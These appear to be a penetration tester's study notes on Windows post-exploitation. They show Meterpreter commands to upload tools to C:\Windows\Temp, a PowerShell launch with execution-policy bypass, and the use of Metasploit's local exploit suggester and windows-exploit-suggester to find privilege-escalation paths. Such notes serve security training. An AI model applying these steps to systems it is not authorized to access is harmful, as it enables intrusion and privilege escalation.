When uploading these tools, you can usually put them in C:\Windows\Temp
	If you're in a meterpreter session, using the following commands should accomplish this.
		`meterpreter> cd c:\\windows\\temp`    - use the extra \ in order to escape the character so that it's not used as code
		`mterpreter> upload <local file path of your tool>`
	If you need to get into powershell to try another tool, use the following
		`meterpreter> shell`
		`meterpreter> powershell -ep bypass`  - `-ep` means execution policy and you are bypassing that.
	If that doesn't work from shell, you can try directly from meterpreter prompt
		`meterpreter> load powershell`
	You can also run the post exploit module from metasploit.  This works as a suggester to give you a few different avenues. 
		`meterpreter> run post/multi/recon/local_exploit_suggester`  - you can tab this out as well
		Once that finishes, you can take that and any info you get from `systeminfo` and copy them into a notepad file.
			`meterpreter> shell`
			`c:\windows\system32\inetsrv>systeminfo`  - save this, it will be needed later
	Also run windows exploit suggester by extracting it after download and then doing the following
		`root@kali:~/Downloads# cd ~` - either to root or wherever you extracted the package
		`root@kali:~# ./windows-exploit-suggeter.py --update`  - You'll want to note the database from this command in the `writing to file <filename>` where the filename will be the database.
		`pip install xlrd --upgrade`  - this will update or install the python-xlrd dependancy
		`root@kali:~# ./windows-exploit-suggester.py --database <the database from the update command> --systeminfo <the file with the sysinfo in it>`


Always Always ALWAYS try more tools.  If one doesn't work, try the next one, and if that doesn't work, try still the next one.
